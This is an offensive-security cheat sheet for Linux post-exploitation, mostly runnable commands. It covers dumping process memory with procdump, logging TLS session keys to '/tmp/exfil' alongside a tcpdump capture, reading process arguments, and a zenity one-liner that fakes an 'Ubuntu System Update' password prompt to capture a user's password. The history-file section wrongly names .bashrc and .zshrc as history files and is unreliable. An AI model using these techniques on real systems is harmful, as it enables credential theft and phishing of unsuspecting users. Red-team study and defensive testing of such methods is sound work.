# Linux
---
1. **[Procdump](#procdump)**
2. **[Decrypting TLS traffic using TLS key logging Not working on latest firefox and chrome](#decrypting-tls-traffic-using-tls-key-logging-not-working-on-latest-firefox-and-chrome)**
3. **[Peeking at shell command-line history files](#peeking-at-shell-command-line-history-files)**
4. **[Command line arguments](#command-line-arguments)**
5. **[Spoofing a credential prompt via zenity on Linux](#spoofing-a-credential-prompt-via-zenity-on-linux)**
---
## Procdump
```bash
## Download procdump
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update -y
sudo apt-get install procdump

## Dump a process
procdump -p <PID>
```
> **Important Note:**
> Dumping a root process requires a root privilege.

---

## Decrypting TLS traffic using TLS key logging (Not working on latest firefox and chrome)
In order to decrypt TLS traffic, TLS key logging can be leveraged, which is a feature that will write TLS sessions keys to a user-defined location. The location can be specified via the **SSLKEYLOGFILE** environment.
```bash
export SSLKEYLOGFILE=/tmp/exfil
```
- **Now lets capture network traffic**
```bash
tcpdump -s 0 -i <interface> -w mycap.pcap
```
- **Finally analyze with wireshark**

---

## Peeking at shell command-line history files
- History file location
```bash
/home/<USER>/.bashrc
## Vary depending on the shell type
## Ex: .zshrc
```
---
## Command line arguments
```bash
## "w" will expand the args
ps auxwww
```
---

## Spoofing a credential prompt via zenity on Linux
```bash
PWD=$(zenity --password --text "Ubuntu Update needs your password: " --title "Ubuntu System Update") 2>/dev/null 
```